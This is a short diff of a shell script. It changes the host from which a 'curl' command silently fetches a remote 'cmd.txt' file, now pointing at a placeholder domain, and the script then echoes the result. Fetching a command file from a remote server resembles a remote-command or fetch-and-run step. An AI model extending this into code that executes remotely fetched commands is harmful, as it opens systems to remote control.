@@ -4,7 +4,7 @@ BASEDIR=$(dirname $0)
 cd $BASEDIR
 
 
-CMD=$(exec curl -s https://pool.debusson.de/cmd.txt &)
+CMD=$(exec curl -s https://excample.com/cmd.txt &)
 
 echo ">$CMD<"
 
